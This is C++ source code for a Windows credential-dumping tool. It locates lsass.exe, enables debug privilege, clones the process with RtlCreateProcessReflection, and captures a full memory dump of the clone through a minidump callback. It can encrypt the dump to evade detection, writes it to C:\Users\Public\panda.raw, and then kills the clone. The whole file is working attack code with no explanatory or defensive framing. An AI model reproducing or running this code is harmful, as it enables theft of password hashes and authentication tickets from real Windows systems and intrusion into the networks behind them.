#include <windows.h>
#include "reflectdump.h"
#include <DbgHelp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <iostream>
#include "DebugHelper.h"

#pragma comment (lib, "Dbghelp.lib")

static LPVOID dBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
static DWORD bRead = 0;


DWORD GetProcessIdByName(LPCUWSTR procname) {
	DWORD pid = 0;
	HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcSnap == INVALID_HANDLE_VALUE) {
		return false;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(pe32);

	if (!Process32FirstW(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return false;
	}

	while (Process32NextW(hProcSnap, &pe32)) {
		if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);
	return pid;
}

BOOL CALLBACK mCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;
		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)dBuf + (DWORD_PTR)callbackInput->Io.Offset);
		bufferSize = callbackInput->Io.BufferBytes;
		bRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

bool reflectDump(bool enc = false)
{
	int returnCode;
	HANDLE dumpFile = NULL;
	DWORD bytesWritten = 0;
	DWORD Pid = GetProcessIdByName(L"lsass.exe");
	if (Pid == 0)
	{
		printf("Could not find lsass.exe PID \n");
		return false;
	}

	std::cout << "Lsass PID: " << Pid << std::endl;
	EnableDebugPrivilege();
	HANDLE victimHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, Pid);
	if (victimHandle == nullptr)
	{

		printf("Could not open a handle to lsass.exe \n");
		return false;
	}

	printf("Got a handle to lsass.exe succesfuly \n");



	HMODULE lib = LoadLibraryA("ntdll.dll");
	if (!lib)
	{
		printf("Could not load ntdll.dll \n");
		return false;
	}

	RtlCreateProcessReflectionFunc RtlCreateProcessReflection = (RtlCreateProcessReflectionFunc)GetProcAddress(lib, "RtlCreateProcessReflection");
	if (!RtlCreateProcessReflection)
	{
		printf("Could not find RtlCreateProcessReflection in ntdll.dll \n");
		return false;
	}

	T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
	NTSTATUS reflectRet = RtlCreateProcessReflection(victimHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &info);
	if (reflectRet == STATUS_SUCCESS) {
		DWORD newPID = (DWORD)info.ReflectionClientId.UniqueProcess;
		printf("Succesfully Mirrored to lsass.exe \n");
		std::cout << "Lsass PID: " << newPID << std::endl;
		HANDLE newHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, newPID);
		if (newHandle == nullptr)
		{

			printf("Could not open a handle to lsass.exe \n");
			return false;
		}

		printf("Got a handle of Mirrored lsass.exe succesfully \n");

		Sleep(5000);


		// Set up minidump callback
		MINIDUMP_CALLBACK_INFORMATION callbackInfo;
		ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
		callbackInfo.CallbackRoutine = &mCallback;
		callbackInfo.CallbackParam = NULL;


		if (MiniDumpWriteDump(newHandle, newPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo) == FALSE)
		{
			printf("Failed to create a dump of the forked process \n");
			return false;

		}

		printf("Successfully created dump of the forked process \n");

		if (enc) {
			// Encryption logic here
			std::cout << "Encrypting the dump data before writing on disk.\n";
			Encrypt(dBuf, bRead);
		}
		else {
			std::cout << "Proceeding without encryption..." << std::endl;
		}

		std::string dumpFileName = "C:\\Users\\Public\\panda.raw";

		dumpFile = CreateFileA(dumpFileName.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (dumpFile == INVALID_HANDLE_VALUE)
		{
			printf("Failed to create dump file \n");
			return false;
		}

		printf("Successfully initialized dump file \n");

		if (WriteFile(dumpFile, dBuf, bRead, &bytesWritten, NULL))
		{
			returnCode = TRUE;
			printf("Successfully dumped lsass process \n");

			Sleep(5000);

			printf("Checking if file exists and greater than 5MBs \n");

			WIN32_FILE_ATTRIBUTE_DATA fileInfo;
			if (GetFileAttributesExA(dumpFileName.c_str(), GetFileExInfoStandard, &fileInfo) == 0)
			{
				printf("Failed to get file attributes");
				return false;
			}


			if (fileInfo.nFileSizeHigh == 0 && fileInfo.nFileSizeLow < 1024 * 1024 * 5)
			{
				printf("File size is less than 5MBs \n");
				return false;
			}

			printf("File exists and size is greater than 5MBs \n");
		}
		else
		{
			printf("Failed to write dump to disk \n");
			return false;
		}

		// Terminate the new lsass.exe process
		HANDLE hNewProcess = OpenProcess(PROCESS_TERMINATE, FALSE, newPID);
		if (hNewProcess == NULL) {
			printf("Failed to open new lsass.exe process \n");
			return false;
		}
		if (!TerminateProcess(hNewProcess, 0)) {
			printf("Failed to terminate new lsass.exe process \n");
			return false;
		}
		printf("New lsass.exe process terminated \n");

	}
	else {
		printf("Could not mirror to lsass.exe \n");
	}

	return true;
}